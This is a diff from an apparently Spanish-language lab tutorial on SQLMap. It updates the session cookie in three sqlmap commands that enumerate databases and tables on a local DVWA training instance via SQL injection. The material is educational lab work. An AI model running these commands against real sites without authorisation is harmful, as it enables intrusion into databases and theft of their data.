@@ -267,15 +267,15 @@ SQLMap es una herramienta de código abierto y uso automatizado para detectar y 
 
 #### Enumerar la BD:
 ```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=t5t4of5eno2hh65c9cfjiagse4" --dbs
 ```
 #### Ver bases de datos disponibles:
 ```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs --batch
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=t5t4of5eno2hh65c9cfjiagse4" --dbs --batch
 ```
 #### Ver las tablas de las bases de datos:
 ```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" -D dvwa --tables --batch
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=t5t4of5eno2hh65c9cfjiagse4" -D dvwa --tables --batch
 ```
 
 #### Explotamos la vulnerabilidad:
